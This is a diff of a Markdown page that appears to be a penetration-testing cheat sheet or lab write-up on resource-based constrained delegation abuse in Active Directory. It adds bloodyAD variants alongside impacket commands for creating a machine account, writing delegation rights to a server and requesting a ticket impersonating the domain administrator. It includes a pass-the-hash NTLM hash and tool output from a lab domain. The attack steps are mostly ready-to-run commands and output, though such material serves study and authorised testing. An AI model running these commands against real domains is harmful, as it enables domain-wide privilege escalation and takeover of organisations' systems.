@@ -158,16 +158,23 @@ d-----        3/20/2024   4:32 AM                Windows
 
 ### Adding Computer
 
+{% code overflow="wrap" %}
 ```python
+bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
+# or 
 └─$ impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Password123' vulnableone.local/khan.chanthou -hashes :142f15864b0dfdee9f742616ea1eb773
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Successfully added machine account myComputer$ with password Password123.
 ```
+{% endcode %}
 
 ### Adding delegation permissions to AppSRV
 
+{% code overflow="wrap" %}
 ```python
+bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
+# or
 └─$ impacket-rbcd -action write -delegate-to "AppSRV$" -delegate-from "myComputer$" vulnableone.local/khan.chanthou -hashes :142f15864b0dfdee9f742616ea1eb773
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -178,9 +185,11 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*]     myComputer$   (S-1-5-21-434106389-3621871093-548134407-20101)
 
 ```
+{% endcode %}
 
 ### Impersonating the Domain administrator
 
+{% code overflow="wrap" %}
 ```python
 └─$ impacket-getST -spn cifs/appsrv.vulnableone.local -impersonate administrator 'vulnableone.local/myComputer$:Passworod123'
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -192,6 +201,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*]     Requesting S4U2Proxy
 [*] Saving ticket in administrator.ccache
 ```
+{% endcode %}
 
 ```bash
 └─$ export KRB5CCNAME=administrator.ccache  
